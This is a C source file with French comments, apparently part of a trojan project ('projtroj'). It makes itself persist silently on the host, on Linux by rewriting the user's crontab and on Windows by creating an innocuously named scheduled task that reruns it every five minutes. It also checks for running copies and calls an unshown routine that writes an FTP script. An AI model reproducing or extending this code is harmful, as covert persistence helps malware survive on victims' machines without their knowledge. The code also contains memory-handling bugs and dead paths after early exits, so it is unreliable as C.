#include "../Headers/projtroj.h"

// A FAIRE:
// -> Modifier le verificationEnCours (et automatisationProgramme) pour qu'il s'adapte au changement de nom du programme
// -> Faire l'automatisation pour XP (a faire chez Mel)
// 


int system_OS = 0; // 1 = linux; 2 = windows XP; 3 = windows7, windows8 et windowsVISTA;
char * cheminAbsoluProgramme;
char * NOM_PROGRAMME;
char * COMMANDE; // On concatene ensuite dans le programme le chemin absolu
const char * NomTaskWindows = "blabla";
const char * NOM_SCRIPT_FTP = "scriptFTP_Demo.bat";






void ReglageCheminAbsoluEtCommandes(char* nomProgramme) {

	if(system_OS == 1) {
	// Récupération du chemin absolu
		int i;
		int taille = strlen(nomProgramme)-1;
		char * nom = (char *) malloc(taille);
		for(i=0; i<taille; i++)
			nom[i] = nomProgramme[i+1];

		char* c = AppelSysteme("pwd");
		
		char* tmp = (char*) malloc(strlen(c)-1);
		for(i=0; i<strlen(c)-1; i++)
			tmp[i] = c[i];
		free(c);
		c = tmp;

		int nbe = ((int)strlen(c))-1;
		strcat(c, nom);
		cheminAbsoluProgramme = c;
		//printf("\n\nChemin = %s\n\n", cheminAbsoluProgramme);

	//Creation des commandes
		tmp = (char*) malloc(strlen(COMMANDE)+strlen(cheminAbsoluProgramme));
		strcpy(tmp,COMMANDE);
		strcat(tmp, cheminAbsoluProgramme);
		COMMANDE = tmp;
		NOM_PROGRAMME = nom;
	} else {
		char * texte = AppelSysteme("cd");
		printf("\n\nNom Programme = %s", nomProgramme);
		//printf("\n\nTexte = (%s)\n\n", texte);	
		texte[strlen(texte)-1] = '\0';//-> annomalie à la fin de la reponse (saut de ligne)
		
		
		//Suppression de l'anomalie à l'indice 0 dans la reponse. 
		char * tmp = (char *) malloc(strlen(texte) - 1);
		int i;
		for(i = 0; i< strlen(texte); i++)
			tmp[i] = texte[i+1];
		free(texte);
		texte = tmp;
		//printf("\n\nChemin = (%s)\n\n", texte);
		
		//Assemblage de tout le chemin
		tmp = (char *) malloc(strlen(texte)+ 1 + strlen(nomProgramme));
		strcpy(tmp, texte);
		strcat(tmp, "\\");
		strcat(tmp, nomProgramme);
		
		texte = tmp;
		
		cheminAbsoluProgramme = texte;
		printf("\n\nChemin complet = (%s)", texte);
		
		//Creation de la commande
		char schtasks [] = "schtasks /Create /TN ";
		char minute [] = " /SC MINUTE /MO 5 /TR '";
		char * debutCommande = (char * ) malloc(strlen(schtasks) + strlen(NomTaskWindows) + strlen(minute));
		strcpy(debutCommande, schtasks);
		strcat(debutCommande, NomTaskWindows);
		strcat(debutCommande, minute);
		
		char * commande = (char*) malloc(strlen(debutCommande)+strlen(cheminAbsoluProgramme)+1);
		strcpy(commande, debutCommande);
		strcat(commande, cheminAbsoluProgramme);
		strcat(commande, "'");
		COMMANDE = commande;
		NOM_PROGRAMME = nomProgramme;
	}
	printf("\n\nCommande = %s\n\n", COMMANDE);
}

void main(int argc, char* argv[]) {

	EcritureScriptFTP(system_OS, (char * )NOM_SCRIPT_FTP);
	exit(0);
	ReglageOS();
	
	ReglageCheminAbsoluEtCommandes(argv[0]);
	
	if(VerificationExecutionProgramme())
		exit(0);

	printf("\n\nProgramme pas deja en cours d'execution\n\n");
	
	exit(0);
	
	
	AutomatisationProgramme();
	exit(0);

	fflush(stdout);
	pause();
}

void ReglageOS() {
	char * texteVersion = AppelSysteme("ver");
//	printf("Version texte = %s", texteVersion);

	if(strlen(texteVersion) == 0) { // sur linux, la sortie standard ressort une chaine vide vu que une erreur est sortie sur la sortie d'erreur
		system_OS = 1;	//Linux
		printf("\n\nLa version est un Linux\n\n");
	}
	else { // Windows
		char * version = strrchr(texteVersion, ' ');
		int num_version = ((int)version[1]) - 48;
		printf("Version = %d\n", num_version);
		if(num_version >= 6){
			printf("\n\nLa version est superieure a XP\n\n");
			system_OS = 3; // Vista, Seven ou 8
		}
		else {
			printf("\n\nLa version est une XP ou anterieure\n\n");
			system_OS = 2; // XP ou avant
		}
	}
}

void AutomatisationProgramme(){

	if(system_OS == 1){
		char tmp [] = "crontab -l | grep '";
		char * commande = (char*) malloc(strlen(tmp)+strlen(cheminAbsoluProgramme)+1);
		strcpy(commande, tmp);
		strcat(commande, cheminAbsoluProgramme);
		strcat(commande,"'");

	printf("\n\nTMP1 = %s", commande);

		char* result = AppelSysteme(commande);
	printf("\n\nTEMPORAIRE = %s\n\n", result);
		if(strstr(result, COMMANDE) == NULL) { // Si il n'y a pas la commande dans le crontab

			printf("\n\nLa commande n'est pas présente dans le fichier crontab ! \n\n");	

			char tmp2 [] = "' >> fich";
			free(commande);
			commande = (char*) malloc(strlen("echo '") + strlen(tmp2) + strlen(COMMANDE));
			strcpy(commande, "echo '");
			strcat(commande, COMMANDE);
			strcat(commande, tmp2);

			system("crontab -l > fich");
			system(commande);
			system("crontab fich");
			system("rm fich");
		}
	}else { //Windows > XP
		char schtasks [] = "schtasks /Query /TN ";
		char * commande = (char * ) malloc(strlen(schtasks) + strlen(NomTaskWindows));
		strcpy(commande, schtasks);
		strcat(commande, NomTaskWindows);
		char* texte = AppelSysteme(commande);
		
		if(strlen(texte) > 0 && strstr(texte, "projtroj") != NULL) {
			printf("\n\nLe programme est automatise\n\n");
		}else {
			system(COMMANDE);
			printf("\n\nLe programme n'est pas encore automatise\n\n");
		}
	}
}


// renvoie vrai si le programme est déjà en cours d'execution
int VerificationExecutionProgramme(){

	if(system_OS == 1) {
		char ps [] = "ps aux | grep ";
		char wc [] = " | wc -l";
		char * commande = (char * ) malloc(strlen(ps) + strlen(NOM_PROGRAMME) + strlen(wc));
		strcpy(commande, ps);
		strcat(commande, NOM_PROGRAMME);
		strcat(commande, wc);
		
		
		char* texte = AppelSysteme(commande);
		int nbProcess = (((int)texte[0]) - 48);

		printf("\n\nNombre de process = %d\n\n", nbProcess);
		return nbProcess > 3;
	}
	return 0; //Pour windows, la question ne se pose pas à condition d'utiliser schtasks
}


char* AppelSysteme(char* commande){

	char buffer [1024];
	char *texte = (char*) malloc(1024) ;

	FILE* fcmd = popen(commande, "r");

	while(fgets(buffer, 1024 , fcmd) != NULL){
		strcat(texte, buffer);
	}

	fclose(fcmd);

	return texte;
}





